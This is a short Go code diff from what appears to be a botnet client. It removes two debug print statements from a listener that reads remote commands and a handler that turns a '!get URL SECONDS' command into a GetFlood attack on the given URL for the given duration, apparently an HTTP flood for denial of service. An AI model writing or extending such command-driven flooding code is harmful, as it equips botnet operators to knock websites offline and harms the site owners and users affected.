@@ -31,7 +31,6 @@ func Listener() {
 
 	for BotScanner.Scan() {
 		if strings.TrimSpace(BotScanner.Text()) != "" {
-			fmt.Println("received")
 			go HandlerCommand(BotScanner.Text())
 		}
 	}
@@ -50,7 +49,6 @@ func HandlerCommand(Command string) {
 
 	if len(strings.Split(Command, " ")) == 3 {
 		if strings.Split(Command, " ")[0] == "!get" {
-			fmt.Println("we hitting this now!!")
 			URL := strings.Split(Command, " ")[1]
 			SECONDS, _ := strconv.Atoi(strings.Split(Command, " ")[2])
 			go methods.GetFlood(URL, SECONDS)
